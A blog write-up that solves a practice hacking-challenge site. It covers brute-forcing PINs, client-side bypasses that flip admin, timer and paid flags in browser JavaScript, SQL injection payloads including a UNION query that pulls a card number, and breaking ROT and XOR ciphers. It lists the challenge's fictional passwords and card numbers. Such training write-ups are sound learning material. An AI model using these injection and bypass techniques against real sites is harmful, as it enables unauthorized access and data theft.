---
title: Can you HACK it?
date: 2019-01-12 22:26:27
tags:
  - hack
  - challenge
  - sql
  - inject
  - js
  - crypto
  - xor
  - rot
---

<https://hack.ainfosec.com/>

This is a HACKING CHALLENGE website.

<!-- toc -->

## Programming

### Post Decrement (10 Points)

```c
int i = 5;
while (i-- > 0) {
    printf("%d,", i);
}
```

What's the output for the code snippet above?

#### Solution 1-1

```plain
4,3,2,1,0,
```

### Brutal Force (50 Points)

Brute force programming challenge. Brute force the PIN.

Submit the correct PIN to proceed (3 - 4 digits long).

**Console message:**

To submit a pin here, use the BrutalForce_submit(pin) function

#### Solution 1-2

```js
for (let i = 100; i < 10000; i++) {
  BrutalForce_submit(i);
}
```

### Code Breaker (300 Points)

Break the alpha-numeric code like in spy movies.
Each guess returns a score.
The higher the score the more characters you have correct and in the correct position.

Submit your guesses (code is 7 alpha-numeric characters long).

**Console message:**

To submit here, use the CodeBreaker_submit(code) function.
It will return a promise that will resolve with the score of the submission.

#### Solution 1-3

1. Try pin like `aaaaaaa` for all characters in `[0-9A-Za-z]`, find out what chars are in the answer

2. Try pin like `a------`, `-a-----` to find the right position of these chars.

### Super ROT (900 Points)

Solve all rotated strings in under 180 seconds.
You're not going to be able to do this by hand.
Also don't get any wrong or you have to start over.
Answered: `0/50`

Time Remaining: `179`

```plain
gtuznkx oy got'z noy
```

Submit the decrypted message.

**Console message:**

To submit here, use the SuperRot_submit(answer) function.
It will return a promise that will resolve with a bool for whether or not the answer was correct.
Use the function SuperRot_getEncryptedMessage() to retrieve the current message to solve.

#### Solution 1-4

1. Try `rot1`, `rot2`, ..., `rot25`

2. Test the result by a word list. Split the sentence into words by space. Count how many words in the list. The more the better.

3. Submit the sentence contains more words. Repeat it 50 times.

## Client-side Protections

### Super Admin (10 Points)

Are you admin tho?

You must be an admin to proceed.

#### Solution 2-1

```js
is_super_admin = true;
```

### Timer (50 Points)

Wait until the timer completes to press the submit button.

How much time is left?

Time Remaining: `3155759`

#### Solution 2-2

1. Add subtree modifications breakpoint.

![Add subtree modifications breakpoint](/images/2019-01-12-can-you-hack-it/add-subtree-modifications-breakpoint.jpg)

2. Wait about 1 second. And then it paused.

3. Move context to `hackerchallenge.js`.

4. Change `seconds` to 3.

```js
seconds = 3;
```

![Debug using call stack](/images/2019-01-12-can-you-hack-it/debug-using-call-stack.jpg)

5. Remove subtree modifications breakpoint.

### Paid Content (100 Points)

Pay for things you want!

You must be a paid user to proceed.

#### Solution 2-3

1. Try submit.

2. Find which send request.

![Network call stack](/images/2019-01-12-can-you-hack-it/network-call-stack.jpg)

3. Set a breakpoint.

4. Press submit button.

5. Check the original answer.

6. Change the answer.

```js
answer = answer.replace('"paid":false', '"paid":true');
```

![Change ajax request](/images/2019-01-12-can-you-hack-it/change-ajax-request.jpg)

## Input Validation

### SQL Login (50 Points)

Figure out the password to login.

Get the password for user: `fry`

Enter the login password.

#### Solution 3-1

1. Enter

```plain
' or '1'='1
```

2. It directly gives you the SQL query result. (This may be impossible for any website)

```plain
admin,Gu3ss_Myp4s%w0rd**
bender,b1t3-my-shiny-m3t4l-4$$
fry,w4ts-w/-th3-17-dungbeetles
farnsworth,P4zuzu!!
scruffy,Im_0n-br3ak
zoidberg,sp4r3-ch4ng3#$$$
```

3. Enter the password will solve the problem.

```plain
w4ts-w/-th3-17-dungbeetles
```

#### Digging Deeper

Enter

```plain
'
```

This may cause SQL syntax error.

And we got SQL error messages. We can find that the SQL is

```sql
SELECT username, password FROM users WHERE username='fry' AND password='$1'
```

We can't get this problem solved with only one request. We must enter the password in the second request.

I think the code might be

```php
<?php
$mysqli = new mysqli("localhost", "username", "password", "database");
if ($mysqli->connect_errno) {
    exit();
}
$result = $mysqli->query("SELECT username, password FROM users WHERE username='fry' AND password='$_POST['answer']'");
if ($result) {
    $row = $result->fetch_assoc();
    if ($row) {
        if ($_POST['answer'] === $row["password"]) {
            $solved = true;
        }
    }
}
```

#### Cheat Table 1

| username   | password                   |
| :--------- | :------------------------- |
| admin      | Gu3ss_Myp4s%w0rd**         |
| bender     | b1t3-my-shiny-m3t4l-4$$    |
| fry        | w4ts-w/-th3-17-dungbeetles |
| farnsworth | P4zuzu!!                   |
| scruffy    | Im_0n-br3ak                |
| zoidberg   | sp4r3-ch4ng3#$$$           |

### SQL Credit Cards (100 Points)

Find the credit card number

Get the credit card number for user: `farnsworth`

Enter the credit card number here

#### Solution 3-2

1. Enter

```plain
'
```

2. So, the SQL is

```sql
SELECT username FROM credit_cards WHERE username='$1' COLLATE NOCASE
```

3. I have tried many times to find out the credit card number field name. Finally, I found it is `card`.

Enter

```plain
' and 1 = 2 union SELECT card FROM credit_cards WHERE username='farnsworth
```

You will get the credit card number.

4. Enter

```plain
4784981000802194
```

#### Cheat Table 2

| username   | card             |
| :--------- | :--------------- |
| admin      | 4300713381842928 |
| bender     | 4768732694626948 |
| fry        | 4385923563192160 |
| farnsworth | 4784981000802194 |
| scruffy    | 4987327898009549 |
| zoidberg   | 4912753912003772 |

## Crypto

### ROT (50 Points)

Rotation cipher challenge.

```plain
a se tay! al'k lzw haulmjwk lzsl ygl kesdd.
```

Submit the decrypted message.

#### Solution 4-1

Try each rot decrypt on <https://rot13.com/>. Input the one which seems like English.

### XOR (100 Points)

XOR crypto challenge.

Key Length: `6`

```plain
2026076e06003d2d096e15073b390c6e111a2c6e083b1a05276e0d381207743a0a2b571935341b6e131a33
```

Submit the decryption key.

> [Tips]
>
> The key only contains alpha-numeric characters.
> What submit is in format like `QwErTy` instead of `517745725479`

#### Solution 4-2

1. Decode the byte string.

```json
[32, 38, 7, 110, 6, 0, 61, 45, 9, 110, 21, 7, 59, 57, 12, 110, 17, 26, 44, 110, 8, 59, 26, 5, 39, 110, 13, 56, 18, 7, 116, 58, 10, 43, 87, 25, 53, 52, 27, 110, 19, 26, 51]
```

2. Group the byte array by key length.

```json
[
  [ 32  , 61  , 59  , 44  , 39  , 116 , 53  , 51 ],
  [ 38  , 45  , 57  , 110 , 110 , 58  , 52  ],
  [ 7   , 9   , 12  , 8   , 13  , 10  , 27  ],
  [ 110 , 110 , 110 , 59  , 56  , 43  , 110 ],
  [ 6   , 21  , 17  , 26  , 18  , 87  , 19  ],
  [ 0   , 7   , 26  , 5   , 7   , 25  , 26  ]
]
```

3. Try `[0-9A-Za-z]` as XOR key for each group. The decrypted string must only contains `[0-9A-Za-z ,.'!]`

```json
[
  ["T"],
  ["N", "W"],
  ["A", "B", "C", "D", "K", "N", "O", "X", "a", "b", "c", "k", "n", "o"],
  ["B", "I", "N", "O", "Y", "Z"],
  ["b", "c", "p", "v", "w"],
  ["C", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "c", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w"]
]
```

4. Brute force. Test each sentence by common words in English like Super ROT.

```plain
the,dCick,wDown,sYx jyxFs ozpD thi5Zazy,qYg 0.12037037037037036
tql,vCizb,eDong,aYx9cyjFs9fzbD mai'Zacp,cYg 0.13513513513513514
the vCick eDown aYx jujFs ovbD the'Zazy cYg 0.21714285714285714
tql7vCizb7eDong7aYx9cbjFs9fabD mar'Zacp7cYg 0.2682926829268293
thd qcicj bdowo fyx kumfs nved tie zazx dyg 0.32857142857142857
thl7qcicb7bdowg7fyx cbmfs faed tar zazp7dyg 0.36324786324786323
the qsick btown fix jumvs ovet the jazy dig 0.4342857142857143
the puick crown gox julps ovdr the!lazy eog 0.4428571428571429
the,quick,brown,fox jymps ozer thi lazy,dog 0.6657142857142857
the quick brown fox jumps over the lazy dog 1
```

Finally, my decrypt key is `TNbNwu`.

> [Comment]
>
> The decrypted message is 'the quick brown fox jumps over the lazy dog'.

## Automatic scripts

<https://github.com/ganlvtech/can-you-hack-it>
